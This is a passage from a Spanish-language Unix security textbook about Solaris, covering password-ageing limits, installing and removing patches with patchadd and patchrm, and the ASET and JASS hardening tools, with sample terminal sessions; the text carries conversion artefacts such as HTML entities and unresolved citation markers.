cuando el usuario inicia una sesi&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;login:&#x00A0;toni
&#x00A0;Password:
&#x00A0;Your&#x00A0;password&#x00A0;will&#x00A0;expire&#x00A0;in&#x00A0;5&#x00A0;days.
&#x00A0;Last&#x00A0;login:&#x00A0;Sun&#x00A0;Jun&#x00A0;24&#x00A0;03:10:49&#x00A0;from&#x00A0;rosita
&#x00A0;anita:~$
</literallayout>
<!--l. 578--><para>Como no todo va a ser hablar bien de Unix a cualquier precio (aunque Solaris tiene muchos
aspectos para hablar bien del operativo), podemos hacer un par de cr&#x02CA;&#x0131;ticas a mecanismos
relacionados con las contrase~nas en Solaris. En primer lugar, quiz&#x00E1;s deja algo que desear la
granularidad que nos ofrece para el envejecimiento de claves: especi&#xFB01;car los valores m&#x00E1;ximo y m&#x02CA;&#x0131;nimo
en semanas a veces no es apropiado, y seguramente si Solaris nos permitiera indicar dichos
valores en d&#x02CA;&#x0131;as podr&#x02CA;&#x0131;amos de&#xFB01;nir pol&#x02CA;&#x0131;ticas m&#x00E1;s precisas; aunque en la mayor&#x02CA;&#x0131;a de ocasiones la
especi&#xFB01;caci&#x00F3;n en semanas es m&#x00E1;s que su&#xFB01;ciente, en casos concretos se echa de menos el poder indicar
los d&#x02CA;&#x0131;as de vigencia de una contrase~na. Otro aspecto que se podr&#x02CA;&#x0131;a mejorar en Solaris es la
robustez de las claves: limitarse a rotaciones del nombre de usuario es en la actualidad algo
pobre; un esquema como el ofrecido en AIX, donde se pueden especi&#xFB01;car incluso diccionarios
externos al operativo contra los que comparar las claves que un usuario elige, ser&#x02CA;&#x0131;a mucho m&#x00E1;s
potente.
<!--br/-->
<!--br/-->Contra el primero de estos comentarios quiz&#x00E1;s se podr&#x02CA;&#x0131;a decir, en defensa de Solaris, que realmente en
/etc/shadow podemos especi&#xFB01;car d&#x02CA;&#x0131;as en lugar de semanas, pero eso implicar&#x02CA;&#x0131;a modi&#xFB01;car el archivo a
mano para cada usuario, algo que no suele ser recomendable en ning&#x00FA;n sistema Unix, o bien ejecutar
/usr/bin/passwd con las opciones apropiadas, de nuevo para todos los usuarios en cuesti&#x00F3;n. Contra el
segundo tambi&#x00E9;n se podr&#x02CA;&#x0131;a argumentar que existen utilidades de terceros para reforzar las contrase~nas que
eligen los usuarios, o bien que no es dif&#x02CA;&#x0131;cil escribir un m&#x00F3;dulo de PAM para evitar que esos usuarios elijan
claves triviales, pero el hecho es que Sun Microsystems por defecto no incorpora ninguno de estos
mecanismos en Solaris.
  </para></section><!--end section--><!--l. 604--><section 
role="section"><title><abbrev role="title-mark">9.5</abbrev><anchor 
   id="x1-1370009.5"  ></anchor>El sistema de parcheado</title>
<!--l. 605--><para>  Como en el resto de Unices, en Solaris un parche se de&#xFB01;ne como un grupo de &#xFB01;cheros y directorios que
reemplaza o actualiza &#xFB01;cheros y directorios existentes en el sistema para tratar de garantizar la ejecuci&#x00F3;n
correcta del software (<citation>[?]</citation>); con la instalaci&#x00F3;n de parches aumentamos &#x2013; al menos te&#x00F3;ricamente &#x2013; la seguridad
y la disponibilidad de un sistema, y es muy recomendable seguir una pol&#x02CA;&#x0131;tica de parcheado estricta, al
menos en cuanto a parches de seguridad se re&#xFB01;ere.
<!--br/-->
<!--br/-->Sun Microsystems distribuye entre sus clientes con contrato de mantenimiento los parches para Solaris y el
resto de sus productos v&#x02CA;&#x0131;a CD-ROM cada pocas semanas, pero &#x2013; mucho m&#x00E1;s r&#x00E1;pido &#x2013;, tambi&#x00E9;n los ofrece a
trav&#x00E9;s de Internet, desde http://sunsolve.sun.com/; aunque el acceso a ciertos parches est&#x00E1; restringido a
clientes con contrato, los relativos a la seguridad de los sistemas y los recomendados son completamente
p&#x00FA;blicos.
<!--br/-->
<!--br/-->Desde Sun Microsystems, cada parche es referenciado mediante un dos n&#x00FA;meros: un &#x2018;patch id&#x2019;, que es el
realmente el identi&#xFB01;cador del parche, y un n&#x00FA;mero de revisi&#x00F3;n del parche, separados ambos por un gui&#x00F3;n; de
esta forma cuando descargamos un parche desde SunSolve y lo descomprimimos, o cuando lo recibimos en
un CD-ROM, dicho parche estar&#x00E1; contenido en un directorio cuyo nombre es justamente esa
referencia:


     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp#&#x00A0;ls&#x00A0;110899-01/
&#x00A0;README.110899-01&#x00A0;&#x00A0;SUNWcsu
&#x00A0;anita:/var/tmp#
</literallayout>
<!--l. 632--><para>Dentro del directorio anterior encontraremos generalmente un &#xFB01;chero donde se nos explica la utilidad del
parche, los problemas que soluciona y la forma de aplicarlo; adem&#x00E1;s, existir&#x00E1;n una serie de subdirectorios
cuyos nombres son los paquetes de software a los que ese parche afecta directamente (es decir, de los que
sustituye o actualiza directorios o archivos). Como podemos ver, en el ejemplo anterior s&#x00F3;lo encontramos
uno de estos subdirectorios, SUNWcsu, lo que indica que el parche s&#x00F3;lo afectar&#x00E1; a &#xFB01;cheros de ese paquete. A su
vez, dentro de cada uno de los directorios que diferencian paquetes software encontramos m&#x00E1;s archivos y
subdirectorios que contienen realmente las versiones actualizadas de programas, as&#x02CA;&#x0131; como &#x00F3;rdenes
post&#x2013;instalaci&#x00F3;n, descripci&#x00F3;n del software actualizado, informaci&#x00F3;n sobre archivos y directorios modi&#xFB01;cados,
etc.
<!--br/-->
<!--br/-->Desde Sun Microsystems se de&#xFB01;nen cinco modelos b&#x00E1;sicos de parches; los standard son parches que
solucionan un problema software o hardware espec&#x02CA;&#x0131;&#xFB01;co, por lo que si ese problema no afecta a nuestros
sistemas no tenemos por qu&#x00E9; instalarlos. Los parches recommended son aquellos que Sun recomienda sea
cual sea nuestro entorno para prevenir problemas en el futuro, y los security son los que resuelven
problemas de seguridad; evidentemente ambos son de instalaci&#x00F3;n casi obligatoria. Un cuarto
tipo son los parches Y2K, que como su nombre indica son los que aseguran el cumplimiento
con el a~no 2000 en todos los productos de Sun; a no ser que trabajemos con versiones de
software o hardware antiguo, rara vez tendremos que instalar uno de estos parches, ya que los
productos m&#x00E1;s o menos nuevos no han de tener problemas con el a~no 2000. Finalmente, el quinto
tipo de parches son los patch clusters; no son realmente otro modelo, sino que se trata de
agrupaciones de los anteriores que se distribuyen en un &#x00FA;nico archivo para descargarlos e instalarlos m&#x00E1;s
c&#x00F3;modamente: incluyen un script denominado &#x2018;install<informalequation><graphic 
fileref="unixsec88x.gif"></graphic></informalequation>cluster&#x2019; que instala en el orden
adecuado todos los parches del grupo, lo que evita al administrador tener que hacerlo uno a
uno.
<!--br/-->
<!--br/-->Para instalar un parche podemos utilizar la orden &#x2018;patchadd&#x2019; en Solaris 7 o superior, o
<!--br/-->&#x2018;installpatch&#x2019; en la versi&#x00F3;n 2.6 o anteriores, en ambos casos evidentemente como root del sistema; suele
ser recomendable, en funci&#x00F3;n del tipo de parche y su criticidad, situar a la m&#x00E1;quina en modo monousuario
antes de aplicarlo, para evitar que actividades de los usuarios puedan interferir con el proceso de
parcheado. De esta forma, si queremos aplicar el parche anterior (110899-01), los pasos a seguir ser&#x02CA;&#x0131;an los
siguientes:

     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp#&#x00A0;who&#x00A0;-r
&#x00A0;&#x00A0;&#x00A0;&#x00A0;.&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;run-level&#x00A0;S&#x00A0;&#x00A0;Jun&#x00A0;&#x00A0;8&#x00A0;06:37&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;?
&#x00A0;anita:/var/tmp#&#x00A0;unzip&#x00A0;110899-01.zip
&#x00A0;anita:/var/tmp#&#x00A0;patchadd&#x00A0;110899-01/
&#x00A0;
&#x00A0;Checking&#x00A0;installed&#x00A0;patches...
&#x00A0;Verifying&#x00A0;sufficient&#x00A0;filesystem&#x00A0;capacity&#x00A0;(dry&#x00A0;run&#x00A0;method)...
&#x00A0;Installing&#x00A0;patch&#x00A0;packages...
&#x00A0;
&#x00A0;Patch&#x00A0;number&#x00A0;110899-01&#x00A0;has&#x00A0;been&#x00A0;successfully&#x00A0;installed.
&#x00A0;See&#x00A0;/var/sadm/patch/110899-01/log&#x00A0;for&#x00A0;details
&#x00A0;
&#x00A0;Patch&#x00A0;packages&#x00A0;installed:
&#x00A0;&#x00A0;&#x00A0;SUNWcsu
&#x00A0;
&#x00A0;anita:/var/tmp#
</literallayout>
<!--l. 692--><para>Muchos parches necesitan un reinicio del sistema para aplicarse correctamente, en especial aquellos que
modi&#xFB01;can alg&#x00FA;n par&#x00E1;metro del n&#x00FA;cleo de Solaris; si instalamos bloques de parches m&#x00E1;s o menos
grandes, como los Maintenance Updates o los Recommended and Security, el reinicio es casi
seguro.
<!--br/-->
<!--br/-->Para comprobar qu&#x00E9; parches para el operativo tenemos instalados en una m&#x00E1;quina podemos utilizar las
&#x00F3;rdenes &#x2018;showrev -p&#x2019; o &#x2018;patchadd -p&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;showrev&#x00A0;-p&#x00A0;|grep&#x00A0;110899-01
&#x00A0;Patch:&#x00A0;110899-01&#x00A0;Obsoletes:&#x00A0;&#x00A0;Requires:&#x00A0;&#x00A0;Incompatibles:&#x00A0;&#x00A0;Packages:&#x00A0;SUNWcsu
&#x00A0;anita:/#
</literallayout>
<!--l. 707--><para>Es importante resaltar lo de &#x2018;para el operativo&#x2019;, ya que estas &#x00F3;rdenes no muestran en ning&#x00FA;n caso los parches
aplicados a la OBP; adem&#x00E1;s, hemos de tener presente que si un parche necesita que se reinicie el sistema,
&#x2018;showrev&#x2019; nos dir&#x00E1; que est&#x00E1; instalado, pero aunque la orden no muestre ning&#x00FA;n mensaje de error, el parche
no tendr&#x00E1; efecto hasta el siguiente reinicio de la m&#x00E1;quina. Siguiendo con nuestro ejemplo para
ver la informaci&#x00F3;n que se nos muestra de cada parche, podemos ver que el parche que hemos
instalado afecta al paquete SUNWcsu (algo que ya sab&#x02CA;&#x0131;amos), no deja obsoletas a versiones
anteriores, no necesita que est&#x00E9; aplicado otro parche para poder instalarse, y tampoco tiene
incompatibilidades.
<!--br/-->
<!--br/-->Si por cualquier motivo deseamos eliminar del sistema un parche que hemos instalado con anterioridad
podemos usar la orden &#x2018;patchrm&#x2019; en Solaris 7 o superior, o &#x2018;backoutpatch&#x2019; si utilizamos versiones m&#x00E1;s
antiguas. Esto restaurar&#x00E1; el estado que pose&#x02CA;&#x0131;a el sistema &#x2013; en cuanto a &#xFB01;cheros y directorios &#x2013; antes de
aplicar el parche:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;who&#x00A0;-r
&#x00A0;&#x00A0;&#x00A0;&#x00A0;.&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;run-level&#x00A0;S&#x00A0;&#x00A0;Jun&#x00A0;&#x00A0;8&#x00A0;06:37&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;S&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;?
&#x00A0;anita:/#&#x00A0;patchadd&#x00A0;-p|grep&#x00A0;110899-01
&#x00A0;Patch:&#x00A0;110899-01&#x00A0;Obsoletes:&#x00A0;Requires:&#x00A0;Incompatibles:&#x00A0;Packages:&#x00A0;SUNWcsu
&#x00A0;anita:/#&#x00A0;patchrm&#x00A0;110899-01
&#x00A0;
&#x00A0;Checking&#x00A0;installed&#x00A0;patches...
&#x00A0;
&#x00A0;Backing&#x00A0;out&#x00A0;patch&#x00A0;110899-01...
&#x00A0;
&#x00A0;Patch&#x00A0;110899-01&#x00A0;has&#x00A0;been&#x00A0;backed&#x00A0;out.
&#x00A0;
&#x00A0;anita:/#&#x00A0;patchadd&#x00A0;-p|grep&#x00A0;110899-01
&#x00A0;anita:/#
</literallayout>
<!--l. 741--><para>El hecho de poder desinstalar un parche con tanta facilidad es debido a que, si no indicamos lo contrario,
cuando utilizamos &#x2018;patchadd&#x2019; para a~nadirlo esta orden hace una copia de seguridad de los &#xFB01;cheros y
directorios que van a modi&#xFB01;car o actualizar, y la guarda en /var/; podemos utilizar la opci&#x00F3;n
&#x2018;-d&#x2019; del comando si no queremos esta copia se genere, pero si lo hacemos hemos de tener
presente que no podremos desinstalar el parche aplicado: por tanto esto s&#x00F3;lo es recomendable
en los casos en los que el espacio libre en /var/ sea muy limitado y no tengamos opci&#x00F3;n de
aumentarlo (por ejemplo, ampliando el &#xFB01;lesystem o simplemente borrando o comprimiendo
archivos).
<!--br/-->
<!--br/-->Sun Microsystems distribuye entre sus clientes con contrato la utilidad PatchDiag, una herramienta
realmente &#x00FA;til para mantener al d&#x02CA;&#x0131;a nuestro nivel de parcheado (y con &#x00E9;l, nuestra seguridad); la principal
funci&#x00F3;n de este software es determinar el nivel de parcheado de una m&#x00E1;quina y compararlo con la lista de
parches Recommended and Security de Sun. Esta lista contiene los parches cuya instalaci&#x00F3;n es
b&#x00E1;sica de cara a garantizar la seguridad o el correcto funcionamiento de los sistemas Solaris, y
representa los parches que obligatoriamente deben estar instalados en sistemas cr&#x02CA;&#x0131;ticos, como
los cortafuegos, si queremos que sean seguros. PatchDiag no aplica estos parches en ning&#x00FA;n
momento, sino que se limita &#x00FA;nicamente a indicar cu&#x00E1;les son necesarios en la m&#x00E1;quina donde se
ejecuta.
  </para></section><!--end section--><!--l. 881--><section 
role="section"><title><abbrev role="title-mark">9.6</abbrev><anchor 
   id="x1-1380009.6"  ></anchor>Extensiones de la seguridad</title>
<!--l. 882--><para>
  </para><!--l. 882--><section 
role="subsection"><title><abbrev role="title-mark">9.6.1</abbrev><anchor 
   id="x1-1390009.6.1"  ></anchor>ASET</title>
<!--l. 883--><para>  ASET (Automated Security Enhancement Tool) es un conjunto de herramientas integradas dentro de
Solaris que permiten monitorizar ciertos valores de par&#x00E1;metros de los &#xFB01;cheros del sistema, desde atributos
ubicados en los inodos (permisos, propietario&#x2026;) hasta el contenido de cada archivo. Estas
herramientas se encuentran en el directorio /usr/aset/, y su utilidad es evidente: permite detectar
cualquier cambio en uno de nuestros &#xFB01;cheros, cambio que si no ha sido realizado por un usuario
debidamente autorizado puede esconder desde un troyano hasta una puerta trasera de entrada al
sistema.
<!--br/-->
<!--br/-->De todas las utilidades de que dispone ASET, la m&#x00E1;s importante es sin duda /usr/aset/aset, un shellscript
encargado de invocar al resto de herramientas. Desde l&#x02CA;&#x0131;nea de comandos, este programa puede recibir
como par&#x00E1;metro el nivel de seguridad deseado en la comprobaci&#x00F3;n: &#x2018;low&#x2019;, que se limita a informar de las

vulnerabilidades potenciales, &#x2018;mid&#x2019;, que modi&#xFB01;ca ciertos par&#x00E1;metros que considera incorrectos, y &#x2018;high&#x2019;, el
m&#x00E1;s restrictivo, que modi&#xFB01;ca m&#x00E1;s a&#x00FA;n dichos par&#x00E1;metros, y que es recomendable en sistemas en los que la
seguridad de Solaris sea un elemento por encima de cualquier otro, como el funcionamiento; incluso en la
p&#x00E1;gina man de aset se advierte que algunas aplicaciones pueden dejar de funcionar si utilizamos este nivel
de seguridad.
<!--br/-->
<!--br/-->Podemos invocar a /usr/aset/aset indic&#x00E1;ndole mediante el par&#x00E1;metro &#x2018;-l&#x2019; el nivel de seguridad
deseado:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;/usr/aset/aset&#x00A0;-l&#x00A0;low
&#x00A0;=======&#x00A0;ASET&#x00A0;Execution&#x00A0;Log&#x00A0;=======
&#x00A0;
&#x00A0;ASET&#x00A0;running&#x00A0;at&#x00A0;security&#x00A0;level&#x00A0;low
&#x00A0;
&#x00A0;Machine&#x00A0;=&#x00A0;anita;&#x00A0;Current&#x00A0;time&#x00A0;=&#x00A0;0628&#x005F;03:11
&#x00A0;
&#x00A0;aset:&#x00A0;Using&#x00A0;/usr/aset&#x00A0;as&#x00A0;working&#x00A0;directory
&#x00A0;
&#x00A0;Executing&#x00A0;task&#x00A0;list&#x00A0;...
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;firewall
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;env
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;sysconf
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;usrgrp
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tune
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cklist
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;eeprom
&#x00A0;
&#x00A0;All&#x00A0;tasks&#x00A0;executed.&#x00A0;Some&#x00A0;background&#x00A0;tasks&#x00A0;may&#x00A0;still&#x00A0;be&#x00A0;running.
&#x00A0;
&#x00A0;Run&#x00A0;/usr/aset/util/taskstat&#x00A0;to&#x00A0;check&#x00A0;their&#x00A0;status:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/aset/util/taskstat&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;[aset&#x005F;dir]
&#x00A0;
&#x00A0;where&#x00A0;aset&#x005F;dir&#x00A0;is&#x00A0;ASET&#x2019;s&#x00A0;operating&#x00A0;directory,currently=/usr/aset.
&#x00A0;
&#x00A0;When&#x00A0;the&#x00A0;tasks&#x00A0;complete,&#x00A0;the&#x00A0;reports&#x00A0;can&#x00A0;be&#x00A0;found&#x00A0;in:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/aset/reports/latest/*.rpt
&#x00A0;You&#x00A0;can&#x00A0;view&#x00A0;them&#x00A0;by:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;more&#x00A0;/usr/aset/reports/latest/*.rpt
&#x00A0;anita:/#
</literallayout>
<!--l. 939--><para>La orden anterior habr&#x00E1; generado un directorio de informes cuyo nombre hace referencia a la fecha y hora de
ejecuci&#x00F3;n, y que al ser el &#x00FA;ltimo se enlaza tambi&#x00E9;n con el nombre latest; todos los reports generados por
aset tienen extensi&#x00F3;n &#x2018;.rpt&#x2019; (son simples &#xFB01;cheros ASCII), y se guardan en /usr/aset/reports/. Cada uno
de ellos contiene el informe de las potenciales vulnerabilidades que aset ha encontrado durante su
ejecuci&#x00F3;n, as&#x02CA;&#x0131; como de los cambios que haya realizado en funci&#x00F3;n del nivel de seguridad especi&#xFB01;cado. Como
aset indica, el hecho de que la ejecuci&#x00F3;n del comando haya &#xFB01;nalizado no implica que los informes se hayan
realizado completamente; podemos ejecutar /usr/aset/util/taskstat para ver que tareas no han
&#xFB01;nalizado a&#x00FA;n.
<!--br/-->
<!--br/-->Adem&#x00E1;s de los informes de los que acabamos de hablar, la primera ejecuci&#x00F3;n de aset genera una serie de
archivos en el directorio /usr/aset/master/: en ellos se guarda una imagen del estado que la herramienta
ha encontrado en el sistema, de forma que una ejecuci&#x00F3;n posterior del programa &#x2013; dentro del mismo nivel
de seguridad &#x2013; puede comprobar qu&#x00E9; par&#x00E1;metros han cambiado en cada uno de los &#xFB01;cheros analizados;
evidentemente, es vital para nuestra seguridad evitar que un atacante pueda modi&#xFB01;car esta imagen, ya que
de lo contrario podr&#x02CA;&#x0131;a &#x2018;enga~nar&#x2019; sin problemas a &#x2018;aset&#x2019;. Por ejemplo, al ejecutar &#x2018;/usr/aset/aset&#x2019; con
un nivel de seguridad &#x2018;low&#x2019; se ha guardado en esa imagen cierta informaci&#x00F3;n sobre un &#xFB01;chero importante
como /etc/inittab (en /usr/aset/asetenv se de&#xFB01;ne la lista de directorios de los que se
guarda una imagen en cada nivel de seguridad); parte de esta informaci&#x00F3;n se encuentra en
/usr/aset/masters/cklist.low:

     </para><literallayout role="verbatim">
&#x00A0;anita:/usr/aset/masters#&#x00A0;grep&#x00A0;inittab&#x00A0;cklist.low
&#x00A0;-rw-r--r--&#x00A0;1&#x00A0;root&#x00A0;sys&#x00A0;1087&#x00A0;Jan&#x00A0;5&#x00A0;23:38&#x00A0;2000&#x00A0;/etc/inittab&#x00A0;&#x00A0;26732&#x00A0;3
&#x00A0;anita:/usr/aset/masters#
</literallayout>
<!--l. 972--><para>Podemos ver que los par&#x00E1;metros registrados de este archivo: propietario y grupo, permisos, n&#x00FA;mero de enlaces,
tama~no, fecha y hora de la &#x00FA;ltima modi&#xFB01;caci&#x00F3;n y un checksum. Si ahora un atacante decidiera
modi&#xFB01;car ese &#xFB01;chero (por ejemplo para situar un troyano en &#x00E9;l) casi con total seguridad modi&#xFB01;car&#x02CA;&#x0131;a
alguno de esos par&#x00E1;metros, por lo que la siguiente ejecuci&#x00F3;n de la herramienta reportar&#x02CA;&#x0131;a este
hecho:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;inittab&#x00A0;/usr/aset/reports/latest/cklist.rpt
&#x00A0;&#x003C;&#x00A0;-rw-r--r--&#x00A0;1&#x00A0;root&#x00A0;sys&#x00A0;1087&#x00A0;Jan&#x00A0;5&#x00A0;23:38&#x00A0;2000&#x00A0;/etc/inittab&#x00A0;&#x00A0;26732&#x00A0;3
&#x00A0;&#x003E;&#x00A0;-rw-r--r--&#x00A0;1&#x00A0;root&#x00A0;sys&#x00A0;1237&#x00A0;Jun&#x00A0;28&#x00A0;19:58&#x00A0;2001&#x00A0;/etc/inittab&#x00A0;&#x00A0;37235&#x00A0;3
&#x00A0;anita:/#
</literallayout>
<!--l. 986--><para>Quiz&#x00E1;s una pr&#x00E1;ctica recomendable para incrementar nuestra seguridad pueda ser plani&#xFB01;car la ejecuci&#x00F3;n de
&#x2018;aset&#x2019; para que se ejecute a intervalos peri&#x00F3;dicos desde &#x2018;crond&#x2019; y para que nos avise (por ejemplo,
mediante correo electr&#x00F3;nico) de cualquier anomal&#x02CA;&#x0131;a detectada en la m&#x00E1;quina. Si lo hacemos as&#x02CA;&#x0131;, hemos de
tener siempre presente que el nivel &#x2018;high&#x2019; prima la seguridad por encima de cualquier otra cosa, por lo
que tras una ejecuci&#x00F3;n plani&#xFB01;cada de &#x2018;aset&#x2019; es posible que alguna aplicaci&#x00F3;n puntual deje de
funcionar.
  </para></section><!--end subsection--><!--l. 994--><section 
role="subsection"><title><abbrev role="title-mark">9.6.2</abbrev><anchor 
   id="x1-1400009.6.2"  ></anchor>JASS</title>
<!--l. 995--><para>  JASS (JumpStart Architecture and Security Scripts, tambi&#x00E9;n conocido como Solaris Security Toolkit) es un
paquete software formado por diferentes herramientas cuyo objetivo es facilitar y automatizar la creaci&#x00F3;n y
el mantenimiento de entornos Solaris seguros; ha sido desarrollado por Alex Noordergraaf y Glenn
Brunette, dos expertos en seguridad de Sun Microsystems conocidos &#x2013; especialmente el primero de ellos &#x2013;
por los BluePrints que peri&#x00F3;dicamente publican. Se puede ejecutar sobre una m&#x00E1;quina donde previamente
hemos instalado Solaris (Standalone Mode), o bien durante la propia instalaci&#x00F3;n del operativo (JumpStart
Technology Mode): conseguimos as&#x02CA;&#x0131; una instalaci&#x00F3;n por defecto segura, algo que se echa de menos en casi
cualquier Unix.
<!--br/-->
<!--br/-->Probablemente la parte m&#x00E1;s importante de JASS son los denominados drivers, &#xFB01;cheros &#x00F3;n que especi&#xFB01;can
diferentes niveles de ejecuci&#x00F3;n de la herramienta, de&#xFB01;niendo qu&#x00E9; scripts se han de ejecutar en cada
uno de esos niveles y qu&#x00E9; archivos se instalar&#x00E1;n como resultado de la ejecuci&#x00F3;n. Cada uno de
estos drivers est&#x00E1; ubicado en el subdirectorio Drivers/ del programa, y tiene tres partes bien
diferenciadas (<citation>[?]</citation>): la primera se encarga de inicializar ciertas variables de entorno necesarias para
una correcta ejecuci&#x00F3;n del driver, la segunda de de&#xFB01;nir qu&#x00E9; &#xFB01;cheros se han de modi&#xFB01;car y qu&#x00E9;
scripts se han de ejecutar, y una tercera parte es la encargada &#xFB01;nal de llevar a cabo los cambios
correspondientes.
<!--br/-->
<!--br/-->En un sistema Solaris ya instalado podemos invocar desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes a JASS pas&#x00E1;ndole como par&#x00E1;metro
el driver que deseemos ejecutar, por ejemplo secure.driver (un driver que implementa por s&#x02CA;&#x0131; s&#x00F3;lo todas
las funcionalidades de JASS):

     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp/jass-0.3#&#x00A0;./jass-execute&#x00A0;-d&#x00A0;secure.driver&#x00A0;-o&#x00A0;jass.log
&#x00A0;./jass-execute:&#x00A0;NOTICE:&#x00A0;Executing&#x00A0;driver,&#x00A0;secure.driver
&#x00A0;./jass-execute:&#x00A0;NOTICE:&#x00A0;Recording&#x00A0;output&#x00A0;to&#x00A0;jass.log
&#x00A0;anita:/var/tmp/jass-0.3#
</literallayout>
<!--l. 1029--><para>Todos los cambios que la ejecuci&#x00F3;n anterior provoca (en el ejemplo anterior podemos verlos en el archivo
&#x2018;jass.log&#x2019;, o en salida est&#x00E1;ndar si no utilizamos la opci&#x00F3;n &#x2018;-o&#x2019;) quiz&#x00E1;s convierten a nuestro
sistema en uno &#x2018;demasiado seguro&#x2019;: es posible que perdamos parte de la funcionalidad de la que
dispon&#x02CA;&#x0131;amos, debido al elevado n&#x00FA;mero de restricciones llevadas a cabo en el sistema; es necesario
que cada administrador revise sus necesidades y los scripts a los que va a invocar antes de
ejecutar JASS. Afortunadamente, una de las caracter&#x02CA;&#x0131;sticas m&#x00E1;s importantes de esta herramienta
es su capacidad para deshacer los cambios que cualquiera de sus ejecuciones haya llevado a
cabo:

     </para><literallayout role="verbatim">
&#x00A0;anita:/var/tmp/jass-0.3#&#x00A0;./jass-execute&#x00A0;-u&#x00A0;-o&#x00A0;jass-undo.log
&#x00A0;./jass-execute:&#x00A0;NOTICE:&#x00A0;Executing&#x00A0;driver,&#x00A0;undo.driver
&#x00A0;Please&#x00A0;select&#x00A0;a&#x00A0;JASS&#x00A0;run&#x00A0;to&#x00A0;restore&#x00A0;through:
&#x00A0;1.&#x00A0;&#x00A0;July&#x00A0;06,&#x00A0;2001&#x00A0;at&#x00A0;03:59:40&#x00A0;(//var/opt/SUNWjass/run/20010706035940)
&#x00A0;Choice?&#x00A0;&#x00A0;1
&#x00A0;./jass-execute:&#x00A0;NOTICE:&#x00A0;Restoring&#x00A0;to&#x00A0;previous&#x00A0;run&#x00A0;//var/opt/SUNWjass/run/&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;20010706035940
&#x00A0;./jass-execute:&#x00A0;NOTICE:&#x00A0;Recording&#x00A0;output&#x00A0;to&#x00A0;jass-undo.log
&#x00A0;anita:/var/tmp/jass-0.3#
</literallayout>
<!--l. 1052--><para>Podemos ver que la desinstalaci&#x00F3;n de los cambios llevados a cabo previamente, mediante la opci&#x00F3;n &#x2018;-u&#x2019;
del programa, nos pregunta qu&#x00E9; ejecuci&#x00F3;n de JASS queremos desinstalar; como s&#x00F3;lo lo hab&#x02CA;&#x0131;amos
lanzado una vez, hemos elegido &#x2018;1&#x2019;, pero si ya hubi&#x00E9;ramos ejecutado la herramienta en diferentes
ocasiones se nos mostrar&#x02CA;&#x0131;an todas ellas, con lo cual siempre podemos devolver a la m&#x00E1;quina a
un estado previo a cualquier ejecuci&#x00F3;n de JASS. Esta caracter&#x02CA;&#x0131;stica es bastante importante,
ya que volvemos a insistir en que, en funci&#x00F3;n del driver al que invoquemos, el sistema puede
quedar incluso demasiado &#x2018;securizado&#x2019;: por poner un ejemplo, la ejecuci&#x00F3;n de secure.driver
eliminar&#x02CA;&#x0131;a cualquier acceso est&#x00E1;ndar al sistema (telnet, FTP, rsh&#x2026;), con lo que ser&#x02CA;&#x0131;a necesario de
disponer de una consola o de SSH para acceder remotamente a la m&#x00E1;quina tras la ejecuci&#x00F3;n de
JASS.
<!--br/-->
<!--br/-->Como hemos dicho antes, tambi&#x00E9;n es posible integrar JASS en la propia instalaci&#x00F3;n del sistema operativo
Solaris; para ello hemos de basarnos en la arquitectura JumpStart de Sun Microsystems (<citation>[?]</citation>), copiando el
paquete de software en el directorio ra&#x02CA;&#x0131;z del servidor JumpStart y siguiendo unos pasos simples explicados
con detalle en <citation>[?]</citation>. Con unas sencillas modi&#xFB01;caciones de algunos &#xFB01;cheros, conseguiremos una
instalaci&#x00F3;n por defecto segura, lo que evitar&#x00E1; que el administrador de los sistemas tenga que ir
m&#x00E1;quina a m&#x00E1;quina para realizar el t&#x02CA;&#x0131;pico hardening postinstalaci&#x00F3;n (cerrar puertos, con&#xFB01;gurar
accesos&#x2026;).
<!--br/-->
<!--br/-->La que acabamos de ver es una herramienta muy recomendable en cualquier sistema Solaris, ya que
